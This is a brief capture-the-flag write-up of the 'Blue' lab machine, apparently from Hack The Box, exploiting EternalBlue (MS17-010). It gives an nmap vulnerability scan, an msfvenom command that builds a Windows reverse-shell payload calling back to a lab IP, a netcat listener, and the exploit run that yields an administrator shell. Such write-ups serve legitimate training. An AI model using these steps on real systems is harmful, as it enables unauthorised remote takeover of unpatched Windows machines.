Blue is a very straight forward box, which as the name suggests, gives us an opportunity to explore 'The' exploit that causes people to talk in riddles!

[EternalBlue](https://en.wikipedia.org/wiki/EternalBlue) (MS17-010) is a devastating exploit.

Lets dive straight in with an nmap scan.

`nmap -sV -Pn 10.10.10.40 --script=vuln |tee -a blue.txt`

I'm going to use a version of the exploit, found on [github](https://github.com/worawit/MS17-010), the `zzz_exploit.py` is the one!


<h3>The Exploit</h3>

First, I use msfvenom to generate the payload...

```

msfvenom -p windows/shell_reverse_tcp -f exe-service lhost=10.10.14.16 lport=443 -o ebevil.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of exe-service file: 15872 bytes
Saved as: ebevil.exe

```

Next, I set my netcat listener to catch the returning shell.

`nc -nlvp 443`



The exploit is simple to execute; in my case the command is:

`python /opt/EternalBlue/zzz_exploit.py 10.10.10.40 ebevil.exe`

Its a simple thing then to grab those flags...

```

c:\Users>type administrator\desktop\root.txt

```
